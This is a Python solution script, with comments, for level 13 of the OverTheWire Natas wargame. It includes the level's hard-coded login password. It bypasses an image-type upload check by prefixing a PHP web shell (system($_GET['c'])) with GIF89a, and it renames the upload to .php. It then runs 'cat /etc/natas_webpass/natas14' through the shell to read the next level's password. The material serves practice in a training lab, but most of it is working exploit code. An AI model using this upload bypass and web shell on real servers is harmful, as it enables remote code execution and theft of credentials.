#!/usr/bin/env python3
'''
Level 13 → Level 14
PHP Remote Code Execution File Upload
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas13.py
https://www.youtube.com/watch?v=avQHoQvhnt0&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=11

Username: natas13
URL:      http://natas13.natas.labs.overthewire.org
password:   jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
problem:

write up:
The problem is in the next php  command in the source  code:
   else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
         echo "File is not an image";
   it actually checks is the first  line of the file if it is an image file
   so  we just create this php file:
     GIF89a
     <?php
       system($_GET['c']);
     ?>

Manual Mode
https://www.jonyschats.nl/writeups/overthewire/natas/natas13/
The load file name is save with a random name which is written in the next html
source code command:
   <input type="hidden" name="filename" value="pzaq62flda.jpg">
lets change .jpg to .php reupload the file, follow the link and we came to
the following webpage:

'''
import base64

import requests
import re
import urllib
import sys


username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )

# This commad upload the file 'revshell.php' to the url
response = session.post(url, auth = (username, password) )

content = response.text
print (content)# The source code without loading a file

# This commad upload the file 'revshell13.php' to the url
response = session.post(url,
                        files = { "uploadedfile" : open('revshell13.php', 'rb') },
                        data = { "filename" : "revshell13.php", "MAX_FILE_SIZE" : "1000" },
                        auth = (username, password) )
content = response.text# The source code with   a file
print (content)

rand_file_name = re.findall('upload/(.*).php"', content)[0] + ".php"
print ("Random file name = ",rand_file_name)
'''
   
 '''

php_file_name = 'upload/'+rand_file_name
print ("php_file_name = ",php_file_name)


command3 = "cat /etc/natas_webpass/natas14"
command4 = "id"
command = command3
response = session.get( url +  php_file_name + '?c='  + command,
                        auth = (username, password ))

#response = session.get( url + php_file_name +'?c=cat /etc/natas_webpass/natas13',
#                        auth = (username, password ))

content = response.text

print (content)